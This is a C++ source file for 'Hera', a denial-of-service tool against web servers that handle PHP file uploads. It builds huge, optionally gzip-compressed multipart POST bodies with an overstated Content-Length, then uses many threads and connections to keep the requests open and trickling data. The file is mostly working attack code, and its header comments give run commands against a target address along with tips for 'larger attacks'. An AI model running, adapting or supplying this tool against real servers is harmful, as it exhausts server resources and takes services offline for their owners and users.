#define _GLIBCXX_USE_CXX11_ABI 0

#include <string.h>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <csignal>
#include <ctime>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <zlib.h>

using namespace std;

#define MOD_GZIP_ZLIB_WINDOWSIZE 15
#define MOD_GZIP_ZLIB_CFACTOR    9
#define MOD_GZIP_ZLIB_BSIZE      8096

/*
Author: Jinny Ramsmark

~=Compile=~
g++ -std=c++11 -pthread main.cpp -o hera -lz

~=Run=~
./hera 192.168.0.209 80 5000 3 /test.php 0.03 20 0 0 20

~=Params=~
./hera host port threads connections path filesize files endfile gzip timeout 

~=Increase maximum file descriptors=~
vim /etc/security/limits.conf

* soft nofile 65000
* hard nofile 65000
root soft nofile 65000
root hard nofile 65000

~=Increase buffer size for larger attacks=~

*/

// Found gzip code here first http://blog.cppse.nl/deflate-and-gzip-compress-and-decompress-functions
// Original work is from link below
// Found this one here: http://panthema.net/2007/0328-ZLibString.html, author is Timo Bingmann
// edited version
/** Compress a STL string using zlib with given compression level and return
  * the binary data. */
string compress_gzip(const std::string& str, int compressionlevel = Z_BEST_COMPRESSION)
{
    z_stream zs;                        // z_stream is zlib's control structure
    memset(&zs, 0, sizeof(zs));

    if (deflateInit2(&zs, 
                     compressionlevel,
                     Z_DEFLATED,
                     MOD_GZIP_ZLIB_WINDOWSIZE + 16, 
                     MOD_GZIP_ZLIB_CFACTOR,
                     Z_DEFAULT_STRATEGY) != Z_OK) 
    {
        throw(std::runtime_error("deflateInit2 failed while compressing."));
    }

    zs.next_in = (Bytef*)str.data();
    zs.avail_in = str.size();           // set the z_stream's input

    int ret;
    char outbuffer[32768];
    std::string outstring;

    // retrieve the compressed bytes blockwise
    do {
        zs.next_out = reinterpret_cast<Bytef*>(outbuffer);
        zs.avail_out = sizeof(outbuffer);

        ret = deflate(&zs, Z_FINISH);

        if (outstring.size() < zs.total_out) {
            // append the block to the output string
            outstring.append(outbuffer,
                             zs.total_out - outstring.size());
        }
    } while (ret == Z_OK);

    deflateEnd(&zs);

    if (ret != Z_STREAM_END) 
    {          
        // an error occurred that was not EOF
        std::ostringstream oss;
        oss << "Exception during zlib compression: (" << ret << ") " << zs.msg;
        throw(std::runtime_error(oss.str()));
    }

    return outstring;
}

// Found this one here: http://panthema.net/2007/0328-ZLibString.html, author is Timo Bingmann
/** Compress a STL string using zlib with given compression level and return
  * the binary data. */
string compress_deflate(const string& str, int compressionlevel = Z_BEST_COMPRESSION)
{
    z_stream zs;                        // z_stream is zlib's control structure
    memset(&zs, 0, sizeof(zs));

    if (deflateInit(&zs, compressionlevel) != Z_OK)
    {
        throw(std::runtime_error("deflateInit failed while compressing."));
    }

    zs.next_in = (Bytef*)str.data();
    zs.avail_in = str.size();           // set the z_stream's input

    int ret;
    char outbuffer[32768];
    std::string outstring;

    // retrieve the compressed bytes blockwise
    do {
        zs.next_out = reinterpret_cast<Bytef*>(outbuffer);
        zs.avail_out = sizeof(outbuffer);

        ret = deflate(&zs, Z_FINISH);

        if (outstring.size() < zs.total_out) {
            // append the block to the output string
            outstring.append(outbuffer,
                             zs.total_out - outstring.size());
        }
    } while (ret == Z_OK);

    deflateEnd(&zs);

    if (ret != Z_STREAM_END) 
    {          
        // an error occurred that was not EOF
        std::ostringstream oss;
        oss << "Exception during zlib compression: (" << ret << ") " << zs.msg;
        throw(std::runtime_error(oss.str()));
    }

    return outstring;
}

string getTime()
{
    auto t = time(nullptr);
    auto tm = *localtime(&t);
    ostringstream out;
    out << put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return out.str();
}

void print(string msg, bool mood)
{
    string datetime = getTime();
    if(mood)
    {
        cout << "[+][" << datetime << "] " << msg << endl;
    }
    else
    {
        cout << "[-][" << datetime << "] " << msg << endl;
    }
}

void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int doConnect(string *payload, string *host, string *port)
{
    int sockfd;
    struct addrinfo hints, *servinfo, *p = NULL;
    int rv, val;
    char s[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;


    if ((rv = getaddrinfo(host->c_str(), port->c_str(), &hints, &servinfo)) != 0) 
    {
        print("Unable to get host information", false);
    }


    while(!p)
    {
        for(p = servinfo; p != NULL; p = p->ai_next) 
        {
            if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) 
            {
                print("Unable to create socket", false);
                continue;
            }

            if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) 
            {
                close(sockfd);
                print("Unable to connect", false);
                continue;
            }

            //connected = true;
            break;
        }
    }

    int failures = 0;
    while(send(sockfd, payload->c_str(), payload->size(), MSG_NOSIGNAL) < 0)
    {
        if(++failures == 5)
        {
            close(sockfd);
            return -1;
        }
    }

    freeaddrinfo(servinfo);
    return sockfd;

}

void attacker(string *payload, string *host, string *port, int numConns, bool gzip, int timeout)
{
    int sockfd[numConns];
    fill_n(sockfd, numConns, 0);
    string data = gzip ? compress_gzip("a\n", 9) : "a\n";

    while(true)
    {
        for(int i = 0; i < numConns; ++i)
        {
            if(sockfd[i] <= 0)
            {
                sockfd[i] = doConnect(payload, host, port);
            }
        }
        
        for(int i = 0; i < numConns; ++i)
        {
            if(send(sockfd[i], data.c_str(), data.size(), MSG_NOSIGNAL) < 0)
    	    {
                close(sockfd[i]);
                sockfd[i] = doConnect(payload, host, port);
    	    }
        }

        sleep(timeout);
    }

     
}

string gen_random(int len) 
{
    char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int alphaLen = sizeof(alphanum) - 1;
    string str = "";

    for(int i = 0; i < len; ++i)
    {
        str += alphanum[rand() % alphaLen];
    }

    return str;
}

string buildPayload(string host, string path, float fileSize, int numFiles, bool endFile, bool gzip)
{
    ostringstream payload;
    ostringstream body;
    int extraContent = (endFile) ? 0 : 100000;

    //Build the body
    for(int i = 0; i < numFiles; ++i)
    {
	body << "-----------------------------424199281147285211419178285\r\n";
	body << "Content-Disposition: form-data; name=\"" << gen_random(10) << "\"; filename=\"" << gen_random(10) << ".txt\"\r\n";
	body << "Content-Type: text/plain\r\n\r\n";

	body << "<?='ThisShouldNotExist'?>\n";
    	for(int n = 0; n < (int)(fileSize*100000); ++n)
    	{
    	    body << "aaaaaaaaa\n";
    	}

	body << "<?='ThisShouldNotExist'?>\n";
    }

    //If we want to end the stream of files, add ending boundary
    if(endFile)
    {
        body << "-----------------------------424199281147285211419178285--";
    }
	
    //Build headers
    payload << "POST " << path.c_str() << " HTTP/1.1\r\n";
    payload << "Host: " << host.c_str() << "\r\n";
    payload << "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0\r\n";
    payload << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    payload << "Accept-Language: en-US,en;q=0.5\r\n";
    payload << "Accept-Encoding: gzip, deflate\r\n";
    payload << "Cache-Control: max-age=0\r\n";
    payload << "Connection: keep-alive\r\n";

    if(gzip)
    {
        payload << "Content-Encoding: gzip\r\n";
        payload << "Content-Type: multipart/form-data; boundary=---------------------------424199281147285211419178285\r\n";
        payload << "Content-Length: " << std::to_string(compress_gzip(body.str(), 9).size()+extraContent) << "\r\n\r\n";
    }
    else
    {
        payload << "Content-Type: multipart/form-data; boundary=---------------------------424199281147285211419178285\r\n";
        payload << "Content-Length: " << body.str().size()+extraContent << "\r\n\r\n";
    }

    //Compress if gzip selected. Add \r\n at end here since we don't want to gzip that part
    if(gzip)
    {
        payload << compress_gzip(body.str(), 9) << "\r\n";
    }
    else
    {
        payload << body.str() << "\r\n";
    }

	return payload.str();
}

void help()
{
    string help = 
    "./hera host port threads connections path filesize files endfile gzip timeout\n\n"
    "host\t\tHost to attack\n"
    "port\t\tPort to connect to\n"
    "threads\t\tNumber of threads to start\n"
    "connections\tConnections per thread\n"
    "path\t\tPath to post data to\n"
    "filesize\tSize per file in MB\n"
    "files\t\tNumber of files per request (Min 1)\n"
    "endfile\t\tEnd the last file in the request (0/1)\n"
    "gzip\t\tEnable or disable gzip compression\n";
    "timeout\t\nTimeout between sending of continuation data (to keep connection alive)\n";

    cout << help;
}

int main(int argc, char *argv[])
{
    cout << "~=Hera 0.8=~\n\n";
    
    if(argc < 10)
    {
        help();
        exit(0);
    }

    string host = argv[1];
    string port = argv[2];
    int numThreads = atoi(argv[3]);
    int numConns = atoi(argv[4]);
    string path = argv[5];
    float fileSize = stof(argv[6]);
    int numFiles = atoi(argv[7]) > 0 ? atoi(argv[7]) : 2;
    bool endFile = atoi(argv[8]) == 1 ? true : false;
    bool gzip = atoi(argv[9]) == 1 ? true : false;
    float timeout = stof(argv[10]) < 0.1 ? 0.1 : stof(argv[10]);
    vector<thread> threadVector;

    print("Building payload", true);
    srand(time(0));
    string payload = buildPayload(host, path, fileSize, numFiles, endFile, gzip);
    //cout << payload << endl;
	
    print("Starting threads", true);
    for(int i = 0; i < numThreads; ++i)
    {
    	threadVector.push_back(thread(attacker, &payload, &host, &port, numConns, gzip, timeout));
        sleep(0.1);
    }

    for(int i = 0; i < numThreads; ++i)
    {
    	threadVector[i].join();
    }
}
